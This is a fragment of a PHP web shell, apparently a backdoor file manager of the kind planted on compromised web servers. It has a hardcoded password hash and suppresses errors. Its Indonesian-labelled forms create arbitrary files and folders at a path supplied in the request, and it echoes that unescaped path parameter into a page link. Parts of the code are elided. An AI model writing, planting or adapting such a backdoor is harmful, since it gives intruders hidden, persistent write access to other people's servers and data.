<?php
error_reporting(0);
$hashed_password = '52374961ca52754641654939a769f9db';
	...
	<nav>
       <div class="container">
	    <div class="nav-wrapper">
	      <a href="https://www.youtube.com" class="brand-logo center">uzbekhistan</a>
	    </div>
	   </div>
  	</nav>
...
<div class="row">
	...
	<?php }else if(isset($_GET['create']) || isset($_GET['createFolder'])){ ?>
		<br>
		<div class="container">
		<?= !empty($pesanCreate) ? "<p class='blue-text text-darken-2'>" . $pesanCreate . "</p>" : ""; ?>
		<form method="POST">
			<input type="hidden" name="pilihan" value="<?= isset($_GET['create']) ? 'create' : 'createFolder'; ?>">
			  <div class="row center-align">
			    <div class="input-field col s6">
			      <input name="createName" id="createFile" type="text" class="validate" value="<?= $namaFile; ?>">
			      <label class="active" for="createFile"><?= isset($_GET['create']) ? 'Nama File' : 'Nama Folder'; ?></label>
			      <?php if(isset($_GET['create'])){ ?>
			      <textarea name="createIsi" class="materialize-textarea" style="height: 400px; background-color: ghostwhite; overflow-y: scroll;"><?= $isiFile; ?></textarea>
			      <?php } ?>
			      <button class="btn waves-effect waves-light" type="submit" name="createAction"><?= isset($_GET['create']) ? 'Create File' : 'Create Folder'; ?></button>
			    </div>
			  </div>
		</form>
		</div>
   ...
   <b class="info">
	 ...
	 <a href="?createFolder&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light blue"><i class="material-icons">create_new_folder</i></a> Add Folder
	<br>
	<b class="info">
